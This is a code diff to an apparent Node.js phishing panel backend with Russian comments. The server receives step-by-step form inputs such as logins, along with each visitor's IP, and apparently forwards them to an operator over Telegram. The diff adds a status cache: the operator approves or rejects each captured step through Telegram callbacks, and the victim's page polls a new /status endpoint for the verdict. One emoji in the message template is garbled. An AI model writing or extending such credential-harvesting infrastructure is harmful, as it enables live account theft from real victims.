@@ -40,6 +40,20 @@ setInterval(() => {
   }
 }, 60 * 60 * 1000); // Проверка каждый час
 
+// Кэш для хранения статусов
+const statusCache = new Map();
+const STATUS_TIMEOUT = 24 * 60 * 60 * 1000; // 24 часа
+
+// Очистка старых статусов
+setInterval(() => {
+  const now = Date.now();
+  for (const [key, data] of statusCache.entries()) {
+    if (now - data.timestamp > STATUS_TIMEOUT) {
+      statusCache.delete(key);
+    }
+  }
+}, 60 * 60 * 1000); // Проверка каждый час
+
 function getUserId(ip) {
   const cached = ipCache.get(ip);
   if (cached) {
@@ -88,8 +102,12 @@ app.post("/step", async (req, res) => {
   const { step, value, origin, userId } = req.body;
   if (!userId) return res.status(400).json({ error: 'No userId' });
 
+  // Сохраняем статус в кэш
+  const statusKey = `${userId}:${step}`;
+  statusCache.set(statusKey, { status: "waiting", timestamp: Date.now() });
+
   const ip = formatIP(req.ip);
-  let msg = `📍 Источник: ${origin || 'Неизвестно'}\n👤 Пользователь #${userId}\n🌐 IP: ${ip}\n`;
+  let msg = `📍 Источник: ${origin || 'Неизвестно'}\n👤 Пользователь #${userId}\n�� IP: ${ip}\n`;
   
   const readable = {
     login: "Логин",
@@ -139,6 +157,18 @@ app.post('/auth-visit', (req, res) => {
   res.json({ userId });
 });
 
+// Добавляем обработчик статуса
+app.get("/status", (req, res) => {
+  const { step, userId } = req.query;
+  if (!userId) return res.json({ status: "none" });
+  
+  const statusKey = `${userId}:${step}`;
+  const cachedStatus = statusCache.get(statusKey);
+  const status = cachedStatus ? cachedStatus.status : "none";
+  
+  res.json({ status });
+});
+
 // Вспомогательные функции
 function formatIP(ip) {
   return ip.replace('::ffff:', '');
@@ -179,8 +209,12 @@ async function pollTelegram() {
         if (update.callback_query) {
           const [userId, step, action] = (update.callback_query.data || '').split(':');
           if (userId && step && action) {
-            // Здесь можно добавить обработку действий, если нужно
-            console.log(`Получено действие для пользователя ${userId}, шаг ${step}: ${action}`);
+            const statusKey = `${userId}:${step}`;
+            statusCache.set(statusKey, { 
+              status: action === 'ok' ? 'ok' : 'fail',
+              timestamp: Date.now()
+            });
+            console.log(`Обновлен статус для пользователя ${userId}, шаг ${step}: ${action}`);
           }
         }
       }
